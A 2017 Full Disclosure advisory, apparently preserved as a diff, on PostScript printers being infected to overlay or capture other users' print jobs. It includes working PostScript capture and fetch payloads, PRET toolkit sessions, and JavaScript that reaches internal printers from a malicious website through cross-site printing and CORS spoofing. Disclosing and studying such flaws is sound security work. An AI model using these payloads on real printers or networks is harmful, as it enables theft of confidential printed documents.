@@ -1,0 +1,335 @@
+
+Date: Mon, 30 Jan 2017 13:37:51 +0100
+From: Jens Müller <jens.a.mueller@....de>
+To: fulldisclosure@...lists.org
+Subject: [FD] Hacking Printers Advisory 1/6: PostScript printers vulnerable
+ to print job capture
+
+TL;DR:  In the scope of academic research on printer security, various
+vulnerabilities in network printers and MFPs have been discovered. This
+is advisory 1 of 6 of the `Hacking Printers' series. Each advisory
+discusses multiple issues of the same category. This post is about
+manipulating and obtaining documents printed by other users, which can
+be accomplished by infecting the printer with PostScript malware. This
+vulnerability has presumably been present in *every PostScript printer*
+since 32 years as solely legitimate PostScript language constructs are
+abused. The attack can be performed by anyone who can print, for example
+through USB or network. It can even be carried out by a malicious
+website, using advanced cross-site printing techniques in combination
+with a novel technique we call `CORS spoofing' (see `Cross-Site Printing
+and CORS Spoofing' section).
+
+==============[ Print Job Manipulation and Disclosure ]===============
+
+-------------------------[ Affected Devices ]-------------------------
+
+Various printers are likely to be affected as the vulnerability is based
+on PostScript, a generic language supported by most laser printers
+(except for Brother based devices which use an incompatible PostScript
+clone named `Br-Script'). The vulnerability has been verfied for the
+devices listed below:
+
+- HP LaserJet 1200 (Firmware version: M.22.09)
+- HP LaserJet 4200N (Firmware version: 20050602)
+- HP LaserJet 4250N (Firmware version: 20150130)
+- HP LaserJet P2015dn (Firmware version: 20070221)
+- HP LaserJet M2727nfs (Firmware version: 20140702)
+- HP LaserJet 3392 AiO (Firmware version: 20120925)
+- HP Color LaserJet CP1515n (Firmware version: 20120110)
+- Lexmark X264dn (Firmware version: NR.APS.N645)
+- Lexmark E360dn (Firmware version: NR.APS.N645)
+- Lexmark C736dn (Firmware version: NR.APS.N644)
+- Dell 5130cdn (Firmware version: 201402240935)
+- Dell 1720n (Firmware version: NM.NA.N099)
+- Dell 3110cn (Firmware version: 200707111148)
+
+Vendors informed: 2016-10-17
+
+--------------------[ Vulnerability Description ]---------------------
+
+By redefining, the `showpage' operator which is contained in every
+PostScript document to print the current page, an attacker can hook in
+there and execute her our own PostScript code. Long term redefinition
+(until the device is restarted) is possible by prepending the
+`startjob'/`exitserver' operators. This PostScript feature allows an
+attacker to overlay all pages to be printed with a custom EPS file. It
+can be used to play pranks like putting `hax0r slogans' on all sheets –
+but also for legitimate tasks such as creating letterheads. Obviously,
+such an approach can only be successful if PostScript is used as printer
+driver. Example code is given below.
+
+----------------------------------------------------------------------
+%!
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%% DRAW A SMILEY ON ALL FURTHER PRINT JOBS %%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+serverdict begin 0 exitserver
+currentdict /showpage_real known false eq
+{/showpage_real systemdict /showpage get def} if
+/showpage {save /showpage {} bind def
+[... put arbitrary EPS file here ...]
+restore showpage_real} def
+----------------------------------------------------------------------
+
+With the capability to hook into arbitrary PostScript operators it is
+possible to manipulate and access foreign print jobs. To parse the
+actual datastream send to the printer, incoming documents can be read
+line-by-line by accessing the PostScript %lineedit special file and
+saved into permanent dictionaries which can later be accessed by the
+attacker. To hook into at the very start of a document to be captured,
+the `BeginPage' system parameter can be abused, which is executed at the
+beginning of every PostScript job. In our proof-of-concept version
+however, the attack is still dependend on a fixed structure for the
+first PostScript operators as provived by CUPS. Example code to capture
+arbitrary documents printed with CUPS (using the PostScript printer)
+driver is shown below. It can be deployed to the printer using netcat
+(`nc printer 9100'). Note that the stored document will not be printed
+anymore. A more advanced version which overcomes this drawback has been
+implemented in the PRET software (see `Proof of concept' section).
+
+----------------------------------------------------------------------
+%!
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%% CAPTURE FURTHER PRINT JOBS %%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+serverdict begin 0 exitserver
+/permanent {/currentfile {serverdict begin 0 exitserver} def} def
+permanent /filter {
+  /strcat {exch dup length 2 index length add string dup
+  dup 4 2 roll copy length 4 -1 roll putinterval} def
+  /rndname (job_) rand 16 string cvs strcat (.ps) strcat def
+  %--------------------------------------------------------------
+  false echo                           % no interpreter slowdown
+  /newjob true def                     % make sure to set new job
+  currentdict /currentfile undef       % reset hooked operator
+  /max 40000 def                       % maximum dict/array size
+  /slots max array def                 % (re-)define slots array
+  /counter 2 dict def                  % slot and line counter
+  counter (slot) 0 put                 % initialize slot counter
+  counter (line) 0 put                 % initialize line counter
+  (capturedict) where {pop}            % print jobs are saved here
+  {/capturedict max dict def} ifelse   % define capture dictionary
+  capturedict rndname slots put        % assign slots to jobname
+  /slotnum {counter (slot) get} def    % get current slot counter
+  /linenum {counter (line) get} def    % get current line counter
+  %--------------------------------------------------------------
+  /capture {
+    linenum 0 eq {                     % start of current slot
+      /lines max array def             % (re-)define lines array
+      slots slotnum lines put          % assign to current slot
+    } if
+    dup lines exch linenum exch put    % add current to lines
+    counter (line) linenum 1 add put   % increment linecounter
+    linenum max eq {                   % slotsize limit reached
+      counter (slot) linenum 1 add put % increment slotcounter
+      counter (line) 0 put             % reset line counter
+    } if
+  } def
+  % - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+  { newjob {(%!\ncurrentfile /ASCII85Decode filter ) capture
+    pop /newjob false def} if (%lineedit) (r) file
+    dup bytesavailable string readstring pop capture pop
+  } loop
+} def
+----------------------------------------------------------------------
+
+After a while, the attacker can come back and list captured jobs:
+
+----------------------------------------------------------------------
+%!
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%% LIST CAPTURED PRINT JOBS %%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+(capturedict) where {(Captured jobs:\n) print capturedict
+{exch ==} forall}{(No jobs captured) print} ifelse flush
+
+----------------------------------------------------------------------
+
+The captured PostScript file (randomly) named 'job_16807.ps' can be
+downloaded by the attacker like this:
+
+----------------------------------------------------------------------
+%!
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%% FETCH CAPTURED PRINT JOBS %%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+/str 65535 string def capturedict /job_16807.ps get {dup null
+ne {{dup null ne {str cvs print} if} forall} if} forall flush
+----------------------------------------------------------------------
+
+These are actually not security bugs in the printers nor in CUPS but
+legitimate features of the PostScript language. However the impact is
+especially relevant to printing devices.
+
+-------------------------[ Proof of Concept ]-------------------------
+
+A Python based proof of concept software entitled Printer Exploitation
+Toolkit (PRET) has been published. The attack to manipulate foreign
+print jobs can be reproduced as follows:
+
+$ git clone https://github.com/RUB-NDS/PRET.git
+$ cd PRET
+$ ./pret.py -q printer ps
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> overlay overlays/smiley.eps
+printer:/> exit
+
+Now, print an arbitrary document using PostScript as printer driver
+(make sure PRET is disconnected to not block the printing channel). You
+should see a smiley overlayed on every page. To capture print jobs, use
+PRET like this:
+
+$ ./pret.py -q printer ps
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+
+printer:/> capture
+Print job operations:  capture <operation>
+  capture start   - Record future print jobs.
+  capture stop    - End capturing print jobs.
+  capture list    - Show captured print jobs.
+  capture fetch   - Save captured print jobs.
+  capture print   - Reprint saved print jobs.
+printer:/> capture start
+Future print jobs will be captured in memory!
+printer:/> exit
+
+Now, print arbitrary documents with CUPS using PostScript as printer
+driver (again, make sure PRET is disconnected to not block the printing
+channel). Afterwards, you can list, fetch or reprint captured documents:
+
+$ ./pret.py -q printer ps
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> capture list
+Free virtual memory: 16.6M | Limit to capture:  5.0M
+date          size  user           jobname                 creator
+
+───────────────────────────────────────────────────────────────────────────────
+Jan 25 18:38  3.1M  -              -                       -
+
+Jan 25 18:40  170K  -              -                       -
+
+printer:/> capture fetch
+Receiving capture/printer/690782792
+3239748 bytes received.
+Receiving capture/printer/690646210
+174037 bytes received.
+printer:/> capture print
+printing...
+printing...
+2 jobs reprinted
+printer:/> capture stop
+Stopping job capture, deleting recorded jobs
+
+-----------------------[ Further Information ]------------------------
+
+Information on this bug/feature of PostScript can be found at:
+http://hacking-printers.net/wiki/index.php/Print_job_manipulation
+http://hacking-printers.net/wiki/index.php/Print_job_retention
+
+==============[ Cross-Site Printing and CORS Spoofing ]===============
+
+As mentioned, this attack can even be performed by a malicious web site
+using advanced cross-site printing techniques in combination with a
+novel technique we call `CORS spoofing'. The idea of this technique is
+discussed below.
+
+Cross-site printing (XSP) attacks empower a web attacker to access the
+printer device as demonstrated by Aaron Weaver who used a hidden Iframe
+to send HTTP POST requests to port 9100/tcp of a printer within the
+victim's internal network. The HTTP header is either printed as plain
+text or discarded based on the printer's settings. The POST data however
+can contain arbitrary print jobs like PostScript or PJL commands to be
+interpreted. In the following, the idea of cross-site printing is
+adapted and improved which enables a web attacker to perform most
+attacks described in wiki obtaining captured print jobs, using the
+victim's web browser acts as a carrier.
+
+Instead of Iframes, we use XMLHttpRequest (XHR) JavaScript objects to
+perform HTTP POST requests to internal printers. A limitation of the
+cross-site printing approach discussed so far is that data can only be
+send to the device, not received because of the same-origin policy. This
+opts out all information disclosure attacks. To bend the restrictions of
+the same-origin policy, cross-origin resource sharing (CORS) can be used
+– if the web server explicitly allows it by sending a special HTTP
+header field. In the scenario of cross-site printing, however, we have
+full control of what the requested `web server' – which actually is a
+printer RIP accessed over port 9100/tcp – sends back to the browser. By
+using PostScript output commands we can simply emulate an HTTP server
+running on port 9100/tcp and define our own HTTP header to be responded
+– including arbitrary CORS Access-Control-Allow-Origin fields which
+instruct the web browser to allow JavaScript access to this resource and
+therefore punch a hole into the same-origin policy.
+
+In such an enhanced variant of XSP – combined with CORS spoofing – a web
+attacker has full access to the HTTP response which allows her to
+extract arbitrary information like captured print jobs from the printer
+device. An example JavaScript snipplet is shown below.
+
+----------------------------------------------------------------------
+job = "\x1B%-12345X\r\n"
+    + "%!\r\n"
+    + "(HTTP/1.0 200 OK\\n) print\r\n"
+    + "(Server: PostScript HTTPD\\n) print\r\n"
+    + "(Access-Control-Allow-Origin: *\\n) print\r\n"
+    + "(Connection: close\\n) print\r\n"
+    + "(Content-Length: ) print\r\n"
+    + "product dup length dup string cvs print\r\n"
+    + "(\\n\\n) print\r\n"
+    + "print\r\n"
+    + "(\\n) print flush\r\n"
+    + "\x1B%-12345X\r\n";
+
+var x = new XMLHttpRequest();
+x.open("POST", "http://printer:9100");
+x.send(job);
+x.onreadystatechange = function() {
+  if (x.readyState == 4)
+    alert(x.responseText);
+};
+----------------------------------------------------------------------
+
+One major problem of XSP is to find out the correct address or hostname
+of the printer. Our approach is to abuse WebRTC which is implemented in
+most modern browsers and has the feature to enumerate IP addresses for
+local network interfaces. Given the local IP address, XHR objects are
+further used to open connections to port 9100/tcp for all 253 remaining
+addresses to retrieve the printer product name using PostScript and CORS
+spoofing which only takes seconds in our tests. If the printer is on the
+same subnet as the victim's host its address can be detected solely
+using JavaScript. WebRTC is in development for Safari and supported by
+current versions of Firefox, Chrome and Edge. Internet Explorer has no
+WebRTC support, but VBScript and Java can likewise be used to leak the
+local IP address. If the address of the local interface cannot be
+retrieved, we apply an intelligent brute-force approach: We try to
+connect to port 80 of the victim's router using XHR objects. For this, a
+list of 115 default router addresses from various Internet-accessible
+resources was compiled. If a router is accessible, we scan the subnet
+for printers as described before.
+
+-------------------------[ Proof of Concept ]-------------------------
+
+A proof-of-concept implementation demonstrating that advanced cross-site
+printing attacks are practical and a real-world threat to companies and
+institutions is available at http://hacking-printers.net/xsp/. It was
+successfully tested on Firefox 48, Chrome 52, Opera 39 and Internet
+Explorer 10. It is worth noting that the Tor Browser blocks the attack
+because it tries to connect to all addresses – including local ones –
+through the Tor network meaning XSP requests never reach the intranet
+printer
+
+-----------------------[ Further Information ]------------------------
+
+Information on cross-site printing can be found at:
+http://hacking-printers.net/wiki/index.php/Cross-site_printing
+https://helpnetsecurity.com/dl/articles/CrossSitePrinting.pdf
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
